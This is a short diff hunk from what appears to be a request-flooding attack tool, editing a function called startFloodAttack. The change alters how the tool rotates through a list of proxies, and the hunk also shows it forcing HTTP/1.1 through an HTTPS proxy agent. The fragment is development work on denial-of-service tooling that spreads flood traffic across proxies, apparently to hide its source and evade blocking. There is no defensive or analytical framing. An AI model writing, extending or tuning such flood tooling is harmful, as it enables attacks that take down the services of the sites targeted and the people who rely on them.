@@ -226,7 +226,7 @@ export async function startFloodAttack(
         let agentToUse: any = undefined;
 
         if (currentActiveProxies.length > 0) {
-          const proxyConfig = currentActiveProxies[(totalSent + i) % currentActiveProxies.length];
+          const proxyConfig = currentActiveProxies[i % currentActiveProxies.length];
           try {
             if (isHttp1Forced && parsedUrl.protocol === "https:") {
               agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, { alpnProtocols: ['http/1.1'] });
